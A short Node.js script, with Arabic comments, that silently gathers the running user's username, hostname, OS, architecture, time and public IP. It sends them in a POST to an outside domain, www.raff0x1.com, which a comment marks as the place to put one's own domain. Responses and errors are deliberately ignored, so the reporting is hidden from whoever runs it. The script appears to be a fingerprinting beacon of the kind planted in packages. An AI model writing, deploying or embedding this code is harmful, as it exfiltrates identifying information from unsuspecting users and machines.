const https = require('https');
const os = require('os');

function getPublicIP(callback) {
  const options = {
    hostname: 'api.ipify.org',
    path: '/?format=json',
    method: 'GET'
  };

  const req = https.request(options, res => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      try {
        const ip = JSON.parse(data).ip;
        callback(ip);
      } catch (e) {
        callback('unknown');
      }
    });
  });

  req.on('error', () => callback('unknown'));
  req.end();
}

getPublicIP(ip => {
  const payload = JSON.stringify({
    user: os.userInfo().username,
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    time: new Date().toISOString(),
    ip: ip
  });

  const options = {
    hostname: 'www.raff0x1.com', // ← ضع دومينك هنا
    port: 443,
    path: '/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payload.length
    }
  };

  const req = https.request(options, res => {
    // تجاهل الاستجابة
  });

  req.on('error', error => {
    // تجاهل الأخطاء
  });

  req.write(payload);
  req.end();
});

